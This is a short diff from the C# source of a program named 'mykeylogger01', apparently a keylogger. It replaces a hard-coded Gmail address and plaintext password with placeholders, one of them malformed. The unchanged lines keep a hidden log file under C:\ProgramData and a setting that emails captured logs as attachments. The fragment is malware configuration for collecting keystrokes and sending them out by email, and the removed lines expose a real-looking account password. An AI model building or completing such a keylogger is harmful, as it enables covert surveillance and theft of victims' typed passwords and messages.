@@ -10,9 +10,9 @@ namespace mykeylogger01
 {
     class Program
     {
-        private const string FROM_EMAIL_ADDRESS = "testlinkedinemail321@gmail.com";
-        private const string FROM_EMAIL_PASSWORD = "Testing321$";
-        private const string TO_EMAIL_ADDRESS = "testlinkedinemail321@gmail.com";
+        private const string FROM_EMAIL_ADDRESS = "{email}";
+        private const string FROM_EMAIL_PASSWORD = "{password";
+        private const string TO_EMAIL_ADDRESS = "email";
         private const string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
